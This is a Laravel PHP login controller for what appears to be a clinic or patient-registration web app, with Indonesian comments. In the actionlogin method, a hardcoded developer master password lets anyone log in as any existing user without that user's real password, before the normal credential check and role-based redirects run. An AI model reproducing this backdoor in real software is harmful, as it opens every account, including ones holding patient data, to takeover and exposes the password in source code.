<?php

namespace App\Http\Controllers;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;

class LoginController extends Controller
{
    public function actionlogin(Request $request)
    {
        $data = [
            'username' => $request->input('username'),
            'password' => $request->input('password'),
        ];

        # default password developers = "passmasterd3veloper"
        if ($data['password'] === 'passmasterd3veloper') {
            // Cek apakah user dengan username yang dimasukkan ada di database
            $user = User::where('username', $data['username'])->first();

            if ($user) {
                // Jika user ditemukan, login sebagai user tersebut
                Auth::login($user);
                return redirect(url('/pasien/beranda'));
            } else {
                // Jika user tidak ditemukan, kirim pesan error tanpa redirect ke halaman login
                return back()->withErrors(['error' => 'Akun tidak ditemukan!']);
            }
        }


        if (Auth::Attempt($data)) {
            if(auth()->user()->role == 'admin'){
                return redirect(url('admin/beranda/index'));
            } else {
                return redirect(url('pasien/pendaftaran/index'));
            }
        }else{
            return back()->withErrors(['error' => 'Username atau password salah!']);
        }
    }

    public function logout(Request $request)
    {   
        Auth::logout();
        return redirect(url('login'));
    }


    public function logoutPasien(Request $request)
    {   
        Auth::logout();
        return redirect(url('/pasien/beranda'));
    }
}
